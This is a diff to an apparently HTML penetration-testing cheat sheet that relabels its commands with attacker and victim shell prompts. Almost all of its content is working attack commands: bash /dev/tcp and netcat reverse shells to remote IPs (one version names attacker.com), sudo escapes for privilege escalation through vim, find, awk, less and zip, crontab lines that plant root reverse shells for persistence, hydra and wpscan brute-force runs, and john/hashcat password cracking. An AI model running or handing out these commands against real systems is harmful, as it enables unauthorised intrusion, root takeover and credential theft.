@@ -38,7 +38,7 @@ and your IP changes just before the game starts, and no script have the correct 
 
 <b>Closed ports give you back a "Connection refused"</b>
 
-<b>hacked-account@victim~: <code>for i in 79 80 81; do echo $i & bash -i >& /dev/tcp/10.10.20.20/$i 0>&1;done</code>
+<b>hacked-account@victim ~/: <code>for i in 79 80 81; do echo $i & bash -i >& /dev/tcp/10.10.20.20/$i 0>&1;done</code>
 
 <br><br>
 
@@ -140,7 +140,7 @@ For more mer info on pwncat visit: <li>https://github.com/calebstewart/pwncat</l
   
 I prefer pwncat as you can just press<b>"CTRL+D"</b> and download and upload files like this:
 
-<b>pform@remote~ hacked-account/:</b><code></code>
+<b>hacked-account@victim ~/</b><code></code>
 
 Press<b>"CTRL+D"</b>
 
@@ -150,7 +150,7 @@ Press<b>"CTRL+D"</b>
 
 Then Press <b>"CTRL+D"</b> again to return to the reverse-shell.
 
-<b>pform@remote~ hacked-account/:</b><code></code>
+<b>hacked-account@victim ~/</b><code></code>
 
 
 
@@ -201,7 +201,7 @@ This java reverse-shell works in Jenkins script console.
 
 <h2>Search programs to privesc</h2>
 
-<b><code>sudo -l</b></code> lists all commands your USER can use with SUDO permissions.
+<b>hacked-account@victim ~/ </b><b><code>sudo -l</b></code> lists all commands your USER can use with SUDO permissions.
 
 If user dont have premisions try:
 
@@ -209,9 +209,9 @@ Linpeas <li>https://github.com/carlospolop/privilege-escalation-awesome-scripts-
 
 LinEnum <li>https://github.com/rebootuser/LinEnum</li>
 
-<b>pform@attacker~: </b><code>find / -perm -u=s -type f 2>/dev/null</code>
+<b>hacked-account@victim ~/ </b><code>find / -perm -u=s -type f 2>/dev/null</code>
 
-<b>pform@attacker~: </b><code>find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null</code>
+<b>hacked-account@victim ~/ </b><code>find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null</code>
 
 
 GTFObins <li>https://gtfobins.github.io/</li>
@@ -221,106 +221,112 @@ GTFObins <li>https://gtfobins.github.io/</li>
 
 bash
 
-<code>sudo -u#-1 /bin/bash</code>
+<b>hacked-account@victim ~/ </b><code>sudo -u#-1 /bin/bash</code>
 
-<code>sudo bash -p</code>
+<b>hacked-account@victim ~/ </b><code>sudo bash -p</code>
 
 vim 
 
-<code>sudo vim</code> followed by <code>:!bash -p</code> ( -p flag make the progrom persist the root permision)
+<b>hacked-account@victim ~/ </b><code>sudo vim</code> followed by <code>:!bash -p</code> ( -p flag make the progrom persist the root permision)
 
 nmap
 
-<code>sudo nmap --interactive</code> followed by <code>!sh</code>
+<b>hacked-account@victim ~/ </b><code>sudo nmap --interactive</code> followed by <code>!sh</code>
 
 iftop
 
-<code>sudo iftop</code> followed by <b>shift+!</b> and Command> <code>/bin/sh</code>
+<b>hacked-account@victim ~/ </b><code>sudo iftop</code> followed by <b>shift+!</b> and Command> <code>/bin/sh</code>
 
 find
 
-<code>sudo find . -exec /bin/sh \; -quit</code>
+<b>hacked-account@victim ~/ </b><code>sudo find . -exec /bin/sh \; -quit</code>
 
 
 nano
 
-<code>sudo nano</code> The Press <b>"CTRL+R CTRL+X"</b><code>reset sh 1>&0 2>&0</code> Can edit the sudoers file
+<b>hacked-account@victim ~/ </b><code>sudo nano</code> The Press <b>"CTRL+R CTRL+X"</b><code>reset sh 1>&0 2>&0</code> Can edit the sudoers file
 
 man
 
-<code>sudo man man </code>followed by <code>!/bin/sh</code>
+<b>hacked-account@victim ~/ </b><code>sudo man man </code>followed by <code>!/bin/sh</code>
 
 awk
 
-<code>sudo awk 'BEGIN {system("/bin/sh")}'</code>
+<b>hacked-account@victim ~/ </b><code>sudo awk 'BEGIN {system("/bin/sh")}'</code>
 
 less
 
-<code>sudo less /etc/profile followed by !/bin/sh</code>
+<b>hacked-account@victim ~/ </b><code>sudo less /etc/profile followed by !/bin/sh</code>
 
-<code>sudo less</code> : <code>!/bin/sh -p</code> ( -p flag make the progrom persist the root permision)
+<b>hacked-account@victim ~/ </b><code>sudo less</code> : <code>!/bin/sh -p</code> ( -p flag make the progrom persist the root permision)
 
 ftp
 
-<code>sudo ftp</code>followed by <code>!/bin/sh</code>
+<b>hacked-account@victim ~/ </b><code>sudo ftp</code>followed by <code>!/bin/sh</code>
 
 more
 
-<code>TERM= sudo more /etc/profile</code> followed by <code>!/bin/sh</code>
+<b>hacked-account@victim ~/ </b><code>TERM= sudo more /etc/profile</code> followed by <code>!/bin/sh</code>
 
 zip
 
-<code>touch my-bum.txt</code>
+<b>hacked-account@victim ~/ </b><code>touch my-bum.txt</code>
 
-<code>sudo zip my-bum.zip my-bum.txt -T --unzip-command="sh -c /bin/bash"</code>
+<b>hacked-account@victim ~/ </b><code>sudo zip my-bum.zip my-bum.txt -T --unzip-command="sh -c /bin/bash"</code>
 
 nc
 
 If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
 
-Run <code>nc -l -p 5555</code> on the attacker box to receive the shell. This only works with netcat traditional.
+Run 
 
-RHOST=attacker.com
+<b>pform@attacker ~/ </b><code>nc -l -p 5555</code> on the attacker box to receive the shell. This only works with netcat traditional.
 
-RPORT=5555
+<b>hacked-account@victim ~/ </b>RHOST=10.10.10.10
 
-sudo nc -e /bin/sh $RHOST $RPORT
+<b>hacked-account@victim ~/ </b>RPORT=5555
 
-------
+<b>hacked-account@victim ~/ </b>sudo nc -e /bin/sh $RHOST $RPORT
 
-add to crontab to get root after 1 min <code>echo ' *  *  *  *  * /usr/bin/nc -c /bin/bash' >> /etc/crontab</code>
+
+Crontab
+
+Add to crontab to get root after 1 min 
+<b>hacked-account@victim ~/ </b><code>echo ' *  *  *  *  * /usr/bin/nc -c /bin/bash' >> /etc/crontab</code>
 
 
 <h1>Spawn TTY shell / Stablelize your Shell</h1>
 
 
 
-<code>python -c 'import pty; pty.spawn("/bin/sh")'</code>
+<b>hacked-account@victim ~/ </b><code>python -c 'import pty; pty.spawn("/bin/sh")'</code>
 
-<code>echo os.system('/bin/bash')</code>
+<b>hacked-account@victim ~/ </b><code>echo os.system('/bin/bash')</code>
 
-<code>/bin/sh -i</code>
+<b>hacked-account@victim ~/ </b><code>/bin/sh -i</code>
 
-<code>perl —e 'exec "/bin/sh";'</code>
+<b>hacked-account@victim ~/ </b><code>perl —e 'exec "/bin/sh";'</code>
 
-<code>perl: exec "/bin/sh";</code>
+<b>hacked-account@victim ~/ </b><code>perl: exec "/bin/sh";</code>
 
-<code>ruby: exec "/bin/sh"</code>
+<b>hacked-account@victim ~/ </b><code>ruby: exec "/bin/sh"</code>
 
-<code>lua: os.execute('/bin/sh')</code>
+<b>hacked-account@victim ~/ </b><code>lua: os.execute('/bin/sh')</code>
 
 
-<b>From rbash to bash</b> <code>ssh user@10.10.10.10 -p 22 -t "bash -l"</code>
+<b>From rbash to bash</b> 
 
+<b>hacked-account@victim ~/ </b><code>ssh user@10.10.10.10 -p 22 -t "bash -l"</code>
 
 
 <b>From crontab to bash</b>
 
 example 1.
 
-First start listner<code>pwncat -l -p 5555</code>
+First start listner
+<b>pform@attacker ~/ </b><code>pwncat -l -p 5555</code>
 
-then <code>echo ' * * * * * bash -i >& /dev/tcp/10.0.10.10/5555 0>&1' >> /etc/crontab</code>
+<b>hacked-account@victim ~/ </b><code>echo ' * * * * * bash -i >& /dev/tcp/10.0.10.10/5555 0>&1' >> /etc/crontab</code>
 
 Then you just have to look and wait in your lister terminal for 1 min.
 
@@ -331,7 +337,7 @@ Then you just have to look and wait in your lister terminal for 1 min.
 
 <b>WPScan</b>
 
-<code>wpscan --url http://10.10.20.20/blog -U admin -P /opt/wordlists/rockyou.txt -t 20</code>
+<b>pform@attacker ~/ </b><code>wpscan --url http://10.10.20.20/blog -U admin -P /opt/wordlists/rockyou.txt -t 20</code>
 
 <b>Hydra</b>
 
@@ -339,46 +345,46 @@ Then you just have to look and wait in your lister terminal for 1 min.
 
 <b>In this example we are passing the traffic over a SSH Tunnel on port : 4444
   
-<code>hydra -l admin -P /opt/wordlists/rockyou.txt 127.0.0.1 http-post-form '/j_acegi_security_check:j_username=admin&j_password=^PASS^&from=%2F&Submit=Sign+in:loginError' -I -s 4444</code>
+<b>pform@attacker ~/ </b><code>hydra -l admin -P /opt/wordlists/rockyou.txt 127.0.0.1 http-post-form '/j_acegi_security_check:j_username=admin&j_password=^PASS^&from=%2F&Submit=Sign+in:loginError' -I -s 4444</code>
 
 <b>example - ssh</b>
 
-<code>hydra -l admin -P /opt/wordlists/rockyou.txt ssh://10.10.20.20 -p 22</code>
+<b>pform@attacker ~/ </b><code>hydra -l admin -P /opt/wordlists/rockyou.txt ssh://10.10.20.20 -p 22</code>
 
 <br><h1>Password Cracking</h1>
 
 <b>ZIP</b>
 
-<code>fcrackzip -u -D -p /opt/wordlists/rockyou.txt zipfile-with-password.zip</code>
+<b>pform@attacker ~/ </b><code>fcrackzip -u -D -p /opt/wordlists/rockyou.txt zipfile-with-password.zip</code>
 
 <b>or</b>
 
-<code>zip2john zip.zip > zip.hash</code>
+<b>pform@attacker ~/ </b><code>zip2john zip.zip > zip.hash</code>
 
-<code>john --format=PKZIP ziphash.txt</code>
+<b>pform@attacker ~/ </b><code>john --format=PKZIP ziphash.txt</code>
 
-<code>john --wordlist /opt/wordlists/rockyou.txt hash.txt</code>
+<b>pform@attacker ~/ </b><code>john --wordlist /opt/wordlists/rockyou.txt hash.txt</code>
 
 <b>PGP-Key</b>
 
 Extract crackable hash
 
-<code>gpg2john wordlist > wordlisthash-from-file</code>
+<b>pform@attacker ~/ </b><code>gpg2john wordlist > wordlisthash-from-file</code>
 
 Crack Hash
 
-<code>john --format=gpg --wordlist=/opt/wordlists/rockyou.txt  wordlisthash-from-file</code>
+<b>pform@attacker ~/ </b><code>john --format=gpg --wordlist=/opt/wordlists/rockyou.txt  wordlisthash-from-file</code>
 
 <b>Crack sha512 (deafult unix root hash)</b>
 
-<code>hashcat -m 1800 -a 0 -o hash-found.txt userhash.txt /opt/wordlists/rockyou.txt</code>
+<b>pform@attacker ~/ </b><code>hashcat -m 1800 -a 0 -o hash-found.txt userhash.txt /opt/wordlists/rockyou.txt</code>
 
 <b>Crack SSH-Key</b>
 
 
-<code>ssh2john id_rsa_file >> extracted_hash</code>
+<b>pform@attacker ~/ </b><code>ssh2john id_rsa_file >> extracted_hash</code>
 
-<code>john extracted_hash --wordlist=/opt/wordlists/rockyou.txt</code>
+<b>pform@attacker ~/ </b><code>john extracted_hash --wordlist=/opt/wordlists/rockyou.txt</code>
 
 OBS! - Don´t foreget to chmod 600 on the id_rsa file
 
@@ -388,13 +394,13 @@ OBS! - Don´t foreget to chmod 600 on the id_rsa file
 
 example 1.
 
-<code>hash-identifier</code>
+<b>pform@attacker ~/ </b><code>hash-identifier</code>
 
 <b>PAST in you hash</b>
 
 example 2.
 
-<code>john hash-file.txt</code>
+<b>pform@attacker ~/ </b><code>john hash-file.txt</code>
 
 
 <h2>Get Reverse-Shell in Wordpress</h2>
@@ -404,7 +410,7 @@ The best thing is to edit the 404.php file for the theme in use, as it dont hang
 
 First you need so set up your listner:
 
-<code>nc -lnvp 5555</code> or <code>pwncat -lp 5555</code>
+<b>pform@attacker ~/ </b><code>nc -lnvp 5555</code> or <code>pwncat -lp 5555</code>
 
 Then just surf to the victim´s wordpress site and try a site that dont exist and it gives you a 404 eror.
 
